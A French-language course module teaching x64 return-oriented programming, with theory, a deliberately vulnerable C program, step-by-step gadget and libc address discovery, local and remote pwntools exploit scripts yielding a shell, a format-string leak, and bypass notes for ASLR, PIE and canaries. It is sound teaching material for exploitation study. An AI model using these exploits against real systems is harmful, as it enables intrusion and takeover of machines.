# 23 - ROP Chains x64

## üéØ Ce que tu vas apprendre

Dans ce module, tu vas d√©couvrir la **Return-Oriented Programming (ROP)**, la technique la plus puissante pour exploiter des binaires prot√©g√©s par NX/DEP. Tu vas apprendre √† construire des cha√Ænes de gadgets pour ex√©cuter du code arbitraire sans injecter de shellcode, et comment bypass les protections modernes.

## üìö Th√©orie

### C'est quoi le ROP ?

Le **Return-Oriented Programming (ROP)** est une technique d'exploitation qui permet d'ex√©cuter du code arbitraire **sans injecter de shellcode** sur la stack. Au lieu d'√©crire ton propre code machine, tu **r√©utilises des morceaux de code existants** dans le binaire ou les biblioth√®ques charg√©es en m√©moire.

Un **gadget ROP** est une s√©quence d'instructions qui se termine par `ret`. Par exemple :
```asm
pop rdi       ; Gadget qui charge une valeur dans RDI
ret
```

### Pourquoi √ßa existe ?

Historiquement, les exploits classiques (buffer overflow) fonctionnaient ainsi :
1. Overflow du buffer
2. √âcrasement de l'adresse de retour avec l'adresse du shellcode
3. Ex√©cution du shellcode plac√© sur la stack

Mais √† partir des ann√©es 2000, les syst√®mes d'exploitation ont introduit **NX (No-eXecute)** sur Linux et **DEP (Data Execution Prevention)** sur Windows. Ces protections marquent la stack comme **non-ex√©cutable**.

R√©sultat : **impossible d'ex√©cuter du shellcode plac√© sur la stack**.

Le ROP contourne cette limitation en r√©utilisant du code **d√©j√† pr√©sent en m√©moire** (donc en zone ex√©cutable).

### Comment √ßa marche ?

Le principe du ROP repose sur le d√©tournement du flux d'ex√©cution via la stack et l'instruction `ret`.

#### Rappel : Comment fonctionne `ret` ?

```asm
ret  ; √âquivalent √† : pop rip (charge l'adresse du sommet de la stack dans RIP)
```

L'instruction `ret` :
1. Lit l'adresse au sommet de la stack (`rsp`)
2. Charge cette adresse dans `rip` (instruction pointer)
3. Incr√©mente `rsp` de 8 octets (x64)

#### Construction d'une ROP chain

Une **ROP chain** est une s√©quence d'adresses de gadgets empil√©es sur la stack. Chaque gadget ex√©cute quelques instructions puis fait un `ret`, qui charge l'adresse du gadget suivant.

**Exemple de ROP chain basique :**

```
Stack avant le premier ret :
+------------------+
| addr_gadget_1    | <- RSP (adresse du premier gadget)
+------------------+
| addr_gadget_2    |
+------------------+
| addr_gadget_3    |
+------------------+
| addr_system()    |
+------------------+
| addr_"/bin/sh"   |
+------------------+
```

**D√©roulement :**
1. Premier `ret` : Charge `addr_gadget_1` dans RIP, incr√©mente RSP
2. Gadget 1 s'ex√©cute (ex: `pop rdi; ret`)
3. Le `ret` de Gadget 1 charge `addr_gadget_2`
4. Gadget 2 s'ex√©cute, etc.

### Les types de gadgets essentiels

Pour exploiter un binaire, tu as besoin de plusieurs types de gadgets :

#### 1. Gadgets de contr√¥le des registres

Ces gadgets permettent de charger des valeurs dans les registres (pour passer des arguments aux fonctions).

```asm
pop rdi ; ret     # Charge un argument dans RDI (1er arg en x64)
pop rsi ; ret     # Charge un argument dans RSI (2√®me arg)
pop rdx ; ret     # Charge un argument dans RDX (3√®me arg)
pop rax ; ret     # Charge une valeur dans RAX
```

**Exemple d'utilisation :**
```
Stack :
+------------------+
| addr(pop rdi)    | <- RSP
+------------------+
| addr_"/bin/sh"   | <- Valeur qui sera charg√©e dans RDI
+------------------+
| addr(system)     | <- Adresse de system()
+------------------+
```

Quand le premier `ret` s'ex√©cute :
1. Charge `pop rdi; ret` dans RIP
2. `pop rdi` charge `addr_"/bin/sh"` dans RDI
3. `ret` charge `addr(system)` dans RIP
4. `system("/bin/sh")` s'ex√©cute avec le bon argument

#### 2. Gadgets arithm√©tiques/logiques

```asm
add rax, rbx ; ret
xor rax, rax ; ret
inc rdi ; ret
```

#### 3. Gadgets de saut/branchement

```asm
jmp rax
call rax
```

### Les techniques ROP avanc√©es

#### ret2libc (Return-to-libc)

Au lieu de construire une longue cha√Æne de gadgets, tu peux directement appeler une fonction dangereuse de la libc comme `system()`.

**Objectif :** Appeler `system("/bin/sh")` pour obtenir un shell.

**Pr√©-requis :**
- Conna√Ætre l'adresse de `system()` dans la libc
- Conna√Ætre l'adresse de la cha√Æne `"/bin/sh"` (souvent pr√©sente dans la libc)
- Un gadget `pop rdi; ret` pour passer l'argument

**ROP chain ret2libc :**
```
+------------------+
| addr(pop rdi)    |
+------------------+
| addr("/bin/sh")  |
+------------------+
| addr(system)     |
+------------------+
```

#### ret2syscall

Sur Linux, tu peux directement appeler un syscall en pr√©parant les registres et en ex√©cutant `syscall`.

**Syscall execve("/bin/sh", NULL, NULL) :**
- RAX = 59 (num√©ro de syscall execve)
- RDI = adresse de "/bin/sh"
- RSI = 0
- RDX = 0

**Gadgets n√©cessaires :**
```asm
pop rax ; ret
pop rdi ; ret
pop rsi ; ret
pop rdx ; ret
syscall ; ret
```

**ROP chain ret2syscall :**
```
+------------------+
| addr(pop rax)    |
+------------------+
| 59               | <- Num√©ro de syscall execve
+------------------+
| addr(pop rdi)    |
+------------------+
| addr("/bin/sh")  |
+------------------+
| addr(pop rsi)    |
+------------------+
| 0                |
+------------------+
| addr(pop rdx)    |
+------------------+
| 0                |
+------------------+
| addr(syscall)    |
+------------------+
```

#### SROP (Sigreturn-Oriented Programming)

Technique avanc√©e qui exploite le syscall `sigreturn` pour **√©crire tous les registres d'un coup** en pla√ßant une fausse `sigcontext` structure sur la stack.

## üîç Visualisation

### Architecture d'une ROP chain compl√®te

```
M√âMOIRE AVANT L'EXPLOITATION
============================

Stack :                      Binaire/Libc :
+------------------+         +------------------+
| buffer[256]      |         | Code ex√©cutable  |
| ...              |         | ...              |
+------------------+         | pop rdi; ret     | <- 0x401234 (gadget 1)
| Saved RBP        |         | ...              |
+------------------+         | pop rsi; ret     | <- 0x401567 (gadget 2)
| Return Address   |         | ...              |
+------------------+         | system()         | <- 0x7f... (libc)
                             | ...              |
                             | "/bin/sh"        | <- 0x7f... (libc)
                             +------------------+


M√âMOIRE APR√àS LE BUFFER OVERFLOW
================================

Stack (√©cras√©e par notre payload) :
+------------------+
| buffer[256]      | <- Rempli de 'A' * 256
| AAAAAAAAAAAAAAAA |
| AAAAAAAAAAAAAAAA |
| ...              |
+------------------+
| Fake RBP         | <- 8 octets (padding)
+------------------+
| 0x401234         | <- Adresse du gadget "pop rdi; ret"
+------------------+
| 0x7f...          | <- Adresse de "/bin/sh"
+------------------+
| 0x7f...          | <- Adresse de system()
+------------------+


EX√âCUTION DE LA ROP CHAIN
=========================

√âtape 1 : ret dans la fonction vuln√©rable
  RSP pointe sur 0x401234
  ret charge 0x401234 dans RIP
  ‚Üí Ex√©cution de "pop rdi; ret" √† 0x401234

√âtape 2 : pop rdi
  pop rdi charge 0x7f... (addr "/bin/sh") dans RDI
  RSP incr√©ment√© de 8 ‚Üí pointe maintenant sur addr(system)

√âtape 3 : ret du gadget
  ret charge addr(system) dans RIP
  ‚Üí system() est appel√© avec RDI = "/bin/sh"

√âtape 4 : system("/bin/sh")
  Ex√©cution de system("/bin/sh")
  ‚Üí SHELL !
```

### Flow d'ex√©cution d√©taill√©

```
Temps  |  RIP                |  RSP         |  RDI          |  Instruction
-------|---------------------|--------------|---------------|------------------
  T0   |  fonction_vuln+42   |  0x7fff0100  |  0x...        |  ret
  T1   |  0x401234           |  0x7fff0108  |  0x...        |  pop rdi
  T2   |  0x401235           |  0x7fff0110  |  0x7f001234   |  ret
  T3   |  0x7f555000         |  0x7fff0118  |  0x7f001234   |  system()

L√©gende :
- T0 : Le ret de la fonction vuln√©rable charge l'adresse du premier gadget
- T1 : pop rdi charge l'adresse de "/bin/sh" dans RDI
- T2 : Le ret du gadget charge l'adresse de system()
- T3 : system("/bin/sh") s'ex√©cute
```

## üíª Exemple pratique

### Binaire vuln√©rable

```c
// vuln.c
#include <stdio.h>
#include <string.h>

void vuln() {
    char buffer[128];
    printf("Enter payload: ");
    gets(buffer);  // Fonction vuln√©rable (pas de limite)
}

int main() {
    vuln();
    return 0;
}
```

**Compilation avec NX activ√© (stack non-ex√©cutable) :**
```bash
gcc vuln.c -o vuln -fno-stack-protector -no-pie
```

Options :
- `-fno-stack-protector` : D√©sactive le canary
- `-no-pie` : D√©sactive ASLR au niveau du binaire (adresses fixes)
- Par d√©faut, NX est activ√© (stack non-ex√©cutable)

**V√©rification des protections :**
```bash
$ checksec --file=vuln
[*] '/home/user/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled        # Stack non-ex√©cutable !
    PIE:      No PIE (0x400000)
```

### √âtape 1 : Trouver l'offset

```bash
# G√©n√©rer un pattern cyclique
$ gdb vuln
gdb> pattern create 200
gdb> run
Enter payload: Aa0Aa1Aa2Aa3...

# Le programme crash avec RIP = 0x...
gdb> pattern offset 0x6141414541412941
[*] Offset: 136
```

**Conclusion :** L'adresse de retour est √©cras√©e apr√®s **136 octets**.

### √âtape 2 : Trouver les gadgets

Utilise **ROPgadget** pour chercher les gadgets dans le binaire :

```bash
$ ROPgadget --binary vuln | grep "pop rdi"
0x0000000000401234 : pop rdi ; ret
```

**Interpr√©tation :**
- √Ä l'adresse `0x401234`, il y a l'instruction `pop rdi; ret`

### √âtape 3 : Trouver les adresses dans la libc

```bash
# Lancer le binaire dans GDB
$ gdb vuln
gdb> break vuln
gdb> run
gdb> p system
$1 = {<text variable, no debug info>} 0x7ffff7e14420 <system>

gdb> find &system, +9999999, "/bin/sh"
0x7ffff7f6d1bd
```

**R√©sultat :**
- `system()` est √† `0x7ffff7e14420`
- `"/bin/sh"` est √† `0x7ffff7f6d1bd`

**ATTENTION :** Ces adresses changent √† chaque ex√©cution si ASLR est activ√©. Pour d√©sactiver ASLR temporairement :
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

### √âtape 4 : Construire l'exploit

```python
#!/usr/bin/env python3
from struct import pack

# Adresses (trouv√©es via GDB)
pop_rdi = 0x401234              # Gadget "pop rdi; ret"
system_addr = 0x7ffff7e14420    # Adresse de system()
binsh_addr = 0x7ffff7f6d1bd     # Adresse de "/bin/sh"

# Construction du payload
payload = b"A" * 136            # Padding jusqu'√† l'adresse de retour

# ROP chain : system("/bin/sh")
payload += pack("<Q", pop_rdi)  # Gadget "pop rdi; ret"
payload += pack("<Q", binsh_addr)  # Argument pour system()
payload += pack("<Q", system_addr) # Adresse de system()

# Envoyer le payload
with open("payload.bin", "wb") as f:
    f.write(payload)

print(f"[+] Payload √©crit dans payload.bin ({len(payload)} octets)")
print(f"[+] Utilisez : ./vuln < payload.bin")
```

**Ex√©cution :**
```bash
$ python3 exploit.py
[+] Payload √©crit dans payload.bin (160 octets)
[+] Utilisez : ./vuln < payload.bin

$ ./vuln < payload.bin
Enter payload:
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ # SHELL OBTENU !
```

### Analyse du payload

```
Payload (160 octets) :
+---------------------------+
| "A" * 136                 | <- Remplissage du buffer + saved RBP
+---------------------------+
| 0x0000000000401234        | <- Gadget "pop rdi; ret"
+---------------------------+
| 0x00007ffff7f6d1bd        | <- Adresse de "/bin/sh"
+---------------------------+
| 0x00007ffff7e14420        | <- Adresse de system()
+---------------------------+
```

**D√©roulement :**
1. Buffer overflow √©crase l'adresse de retour
2. `ret` de `vuln()` charge `0x401234` (gadget `pop rdi; ret`)
3. `pop rdi` charge l'adresse de `"/bin/sh"` dans RDI
4. `ret` du gadget charge `0x7ffff7e14420` (system)
5. `system("/bin/sh")` est appel√©
6. Shell obtenu !

## üéØ Application Red Team

### Sc√©nario : Exploitation d'un serveur avec NX activ√©

**Contexte :**
- Serveur Linux avec NX/DEP activ√©
- Binaire vuln√©rable √©coutant sur un port r√©seau
- Pas de canary, pas de PIE
- Libc connue (m√™me version sur le serveur)

**Exploit distant avec ret2libc :**

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
HOST = "192.168.1.50"
PORT = 9001

# Adresses (calcul√©es √† partir de la libc connue)
libc_base = 0x7ffff7de0000      # Base de la libc (leak ou bruteforce)
system_offset = 0x50d60         # Offset de system() dans la libc
binsh_offset = 0x1d8d1b         # Offset de "/bin/sh" dans la libc

system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset

# Gadgets (trouv√©s avec ROPgadget)
pop_rdi = 0x401234

# Connexion au serveur
io = remote(HOST, PORT)

# Construction de la ROP chain
rop = b"A" * 136
rop += p64(pop_rdi)
rop += p64(binsh_addr)
rop += p64(system_addr)

# Envoi du payload
io.sendline(rop)

# Shell interactif
io.interactive()
```

**Output :**
```bash
$ python3 exploit_remote.py
[+] Opening connection to 192.168.1.50 on port 9001: Done
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
$ cat /root/flag.txt
FLAG{ROP_1s_p0w3rful_4g41nst_NX}
```

### Cas r√©el : Exploitation avec ASLR partiel

Si ASLR est activ√© mais que tu peux **leak une adresse de la libc**, tu peux calculer toutes les autres adresses.

**Technique de leak :**
1. Utilise une vuln√©rabilit√© de format string pour leak une adresse de la stack ou du GOT
2. Calcule la base de la libc
3. Ajoute les offsets pour obtenir `system()` et `"/bin/sh"`

**Exemple avec format string :**
```python
# Leak d'une adresse via %p
io.sendline(b"%3$p")  # Leak le 3√®me argument (adresse libc)
leak = int(io.recvline().strip(), 16)
libc_base = leak - 0x21bf7  # Offset connu dans la libc

# Calcul des adresses
system_addr = libc_base + 0x50d60
binsh_addr = libc_base + 0x1d8d1b

# Suite de l'exploit...
```

## üõ°Ô∏è Protections et bypass

### Protection : NX/DEP (Stack non-ex√©cutable)

**M√©canisme :**
- La stack est marqu√©e comme non-ex√©cutable au niveau du MMU (Memory Management Unit)
- Toute tentative d'ex√©cuter du code sur la stack provoque un **SIGSEGV**

**Bypass : ROP**
- R√©utilise du code existant en m√©moire ex√©cutable (binaire, libc, etc.)
- Pas besoin d'ex√©cuter du code sur la stack

### Protection : ASLR (Address Space Layout Randomization)

**M√©canisme :**
- Randomise les adresses de la stack, heap, libc, etc. √† chaque ex√©cution
- Rend les adresses impr√©visibles

**Bypass :**
1. **Leak d'adresse** : Exploite une vuln√©rabilit√© de format string ou de lecture pour leak une adresse, puis calcule les autres
2. **Bruteforce** : Sur 32 bits, l'espace d'adressage est limit√© (12 bits d'entropie pour la libc) ‚Üí bruteforce possible
3. **Partial Overwrite** : √âcrase seulement les octets de poids faible de l'adresse de retour

### Protection : PIE (Position Independent Executable)

**M√©canisme :**
- Le binaire lui-m√™me est charg√© √† une adresse al√©atoire
- Les adresses des gadgets changent √† chaque ex√©cution

**Bypass :**
- Leak d'une adresse du binaire pour calculer la base
- Utilise des gadgets de la libc (si pas de PIE sur la libc)

### Protection : Stack Canary

**M√©canisme :**
- Valeur al√©atoire plac√©e entre le buffer et l'adresse de retour
- V√©rifi√©e avant le `ret`

**Bypass :**
- Leak du canary via format string ou lecture
- Bruteforce du canary octet par octet (si fork)
- √âcrasement partiel (si le canary n'est pas compl√®tement √©cras√©)

## üìù Points cl√©s

1. **ROP contourne NX/DEP** en r√©utilisant du code existant au lieu d'injecter du shellcode

2. **Gadget ROP** = s√©quence d'instructions se terminant par `ret`

3. **ret2libc** = appel direct d'une fonction dangereuse (system, execve, etc.)

4. **ret2syscall** = invocation directe d'un syscall en pr√©parant les registres

5. **ROP chain** = s√©quence d'adresses de gadgets empil√©es sur la stack

6. **Outils essentiels :**
   - **ROPgadget** : Cherche des gadgets dans un binaire
   - **pwntools** : Framework Python pour √©crire des exploits
   - **GDB + pwndbg** : D√©bogage et recherche d'adresses

7. **Convention d'appel x64 (System V AMD64 ABI) :**
   - 1er argument : RDI
   - 2√®me argument : RSI
   - 3√®me argument : RDX
   - 4√®me argument : RCX
   - 5√®me argument : R8
   - 6√®me argument : R9

8. **Protection moderne = combinaison :**
   - NX + ASLR + PIE + Canary ‚Üí tr√®s difficile mais pas impossible

9. **Techniques avanc√©es :**
   - SROP (Sigreturn-Oriented Programming)
   - ret2dlresolve (r√©solution dynamique de symboles)
   - JOP (Jump-Oriented Programming)

## ‚û°Ô∏è Prochaine √©tape

Maintenant que tu ma√Ætrises le ROP en x64, tu vas apprendre √† **√©crire du shellcode x64** dans le module 24. Tu d√©couvriras comment g√©n√©rer du code machine optimis√© pour obtenir un shell, injecter des commandes, et √©viter les bad bytes.
